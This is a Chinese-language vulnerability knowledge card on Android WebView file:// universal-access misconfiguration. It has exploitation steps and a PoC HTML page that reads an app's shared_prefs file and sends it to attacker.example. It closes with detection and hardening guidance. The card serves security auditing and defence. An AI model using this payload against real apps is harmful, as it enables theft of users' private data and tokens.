---
id: mobile-android-webview-file-universal-access-local-read
title: Android WebView 开启 file 协议通用访问：恶意 file:// 页面跨域读取私有目录与本地文件
type: scenario
domain: mobile
path: mobile/android
technique: android-webview-file-url-universal-access-local-file-read
aliases:
- setAllowFileAccessFromFileURLs
- setAllowUniversalAccessFromFileURLs
- WebView file 协议跨域
- file:// 同源绕过
- WebView 本地文件读取
tags:
- android
- webview
- file-protocol
- same-origin
- local-file-read
- misconfiguration
- mobile
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V133
  verified_at: '2026-11-06T05:41:54+08:00'
  notes: 已对照原文与图30核对：VULN-005 明确 WebView 允许 File 协议同源跨域可读取本地任意文件，严重度 High、状态已确认，代码证据指向 setAllowFileAccessFromFileURLs/setAllowUniversalAccessFromFileURLs 类配置。未验证点：原文未提供端到端 PoC，攻击入口与可读路径为按 Android 机制补全，卡片已标 confidence=medium；具体 WebView 版本/目标 SDK 与 CSP 未给出；frontmatter 无 sources/source_url。
---

## 一句话结论

Android WebView 若开启 `setAllowFileAccessFromFileURLs(true)` 或 `setAllowUniversalAccessFromFileURLs(true)`，加载的 `file://` 页面即可用 XMLHttpRequest/fetch 读取其他 `file://` 路径，绕过同源策略读取应用私有目录、SharedPreferences、数据库、配置、token 等本地文件；攻击者只需让 App 的 WebView 加载一个恶意本地 HTML（下载文件、文件管理器打开、deeplink 或应用自身加载本地文件）即可利用。

## 原理

- **file:// 的同源限制**：默认情况下 `file://` 页面不能读取其他本地文件（file origin 被视为不透明源）；`setAllowFileAccessFromFileURLs` 允许 file 页面访问其他 file URL，`setAllowUniversalAccessFromFileURLs` 进一步允许其访问任意来源（包括网络）。
- **开启后的能力**：恶意 HTML 中的 `XMLHttpRequest` 可以 `GET file:///data/data/<pkg>/shared_prefs/*.xml`、`file:///data/data/<pkg>/databases/*`、`/sdcard/...` 等，读取内容后用 `fetch`/`Image.src` 发往攻击者服务器；若 WebView 同时注入 JSBridge，还可直接调用原生能力外带。
- **为什么是漏洞**：应用私有目录本应只对同 UID 进程可见，WebView 的 file 跨域设置把“本地文件读取”能力暴露给了任意能在该 WebView 中执行的页面；攻击者不需要 Root，也不需要应用内登录。
- **攻击面**：App 若用 WebView 加载下载的 HTML、用户选择的本地文件、`file://` deeplink，或允许第三方页面通过 `loadDataWithBaseURL("file://...")` 注入内容，就可能把恶意页面送进 WebView。
- **版本差异**：`setAllowFileAccessFromFileURLs`/`setAllowUniversalAccessFromFileURLs` 在较新 API 上默认 false，但不少历史应用为兼容本地页面显式开启；具体可利用性还取决于 WebView 版本、JS 开关、网络权限与 CSP。

## 触发条件

- 目标 App 的 WebView 显式开启 `setAllowFileAccessFromFileURLs(true)` 或 `setAllowUniversalAccessFromFileURLs(true)`（或等价配置），且 JavaScript 开启。
- 攻击者能让 App 的 WebView 加载一个 `file://` 页面（下载的 HTML、文件管理器/第三方应用打开、deeplink 传入 file URL、应用自身把用户文件当网页加载等）。
- App 具有网络权限（用于外带）或 WebView 注入了可外带的 JSBridge。
- 目标文件对 App 进程可读（应用私有目录天然可读；其他应用目录受沙箱限制）。

## 利用步骤

1. 静态审计 WebView 配置：搜索 `setAllowFileAccessFromFileURLs`、`setAllowUniversalAccessFromFileURLs`、`setAllowFileAccess`、`setJavaScriptEnabled`，确认是否开启及 WebView 加载入口。
2. 构造恶意 HTML：用同步 `XMLHttpRequest` 读取目标 `file://` 路径，拼接后通过 `fetch`、`Image.src` 或表单提交发往攻击者服务器。
3. 投递：把 HTML 下载到设备后诱导用户用目标 App 打开，或通过 deeplink/文件选择器让 App 以 `file://` 加载；也可结合 App 自身的“打开本地 HTML/离线包”功能。
4. 收取数据：在攻击者服务器日志中读取 SharedPreferences、数据库、配置与 token；必要时用窃得的 token 访问业务接口验证。

## PoC

```html
<!-- 恶意 file:// 页面（最小示例，需目标 WebView 开启 file 跨域） -->
<script>
function readFile(path) {
  var x = new XMLHttpRequest();
  x.open('GET', 'file://' + path, false); // 同步读取
  x.send();
  return x.responseText;
}
var data = readFile('/data/data/com.target.app/shared_prefs/config.xml');
// 外带：优先 fetch，失败则用 Image 探测
fetch('https://attacker.example/collect', {method:'POST', body:data});
new Image().src = 'https://attacker.example/pixel?len=' + data.length;
</script>
```

```text
# 验证点
1. 目标 WebView 是否允许 file:// 页面执行 JS 并发起 file:// XHR；
2. 返回内容是否为应用私有目录文件；
3. 攻击者服务器是否收到数据。
# 原文案例中该问题由 AI 流水线在 VULN-005 标记为“已确认/High”，
# 但未给出端到端 PoC，故本卡 confidence=medium。
```

## 变体与关联

- **仅 `setAllowFileAccess(true)`**：允许 WebView 加载 file URL，但不一定允许 file 页面读取其他 file；需结合 `setAllowFileAccessFromFileURLs` 判断。
- **`loadDataWithBaseURL("file://...")`**：把攻击者可控 HTML 以 file 源加载，等价于获得 file 页面执行环境。
- **JSBridge 组合**：file 页面读取本地文件后直接调用 JSBridge 外带，绕过网络权限/CSP 限制；参见 [[mobile-android-webview-jsbridge-arbitrary-origin-credential-theft]]。
- **其他本地数据面**：`content://` URI、`/sdcard`、应用缓存、离线包目录、WebView 的 localStorage/IndexedDB。
- **关联流程**：该问题由六阶段 AI 移动分析流水线在客户端配置审计阶段发现，见 [[ai-security-agent-security-mobile-reverse-six-stage-skill-pipeline]]。

## 检测与防御

- **配置加固**：显式设置 `setAllowFileAccessFromFileURLs(false)`、`setAllowUniversalAccessFromFileURLs(false)`；非必要关闭 `setAllowFileAccess(false)`；使用 `WebViewAssetLoader` 以 `https://` 虚拟源加载本地资源。
- **加载入口校验**：只加载白名单 https 域名；禁止加载用户提供的 `file://`/`content://` 页面；对 deeplink/文件选择器传入的 URL 做协议与来源校验。
- **运行防护**：WebView 最小权限、关闭不必要 JS、设置 CSP、限制 JSBridge 可调用面；对读取私有目录的行为告警。
- **检测**：静态扫描上述 API 的开启情况；动态监控 WebView 对 `file://` 的 XHR 与异常外连。
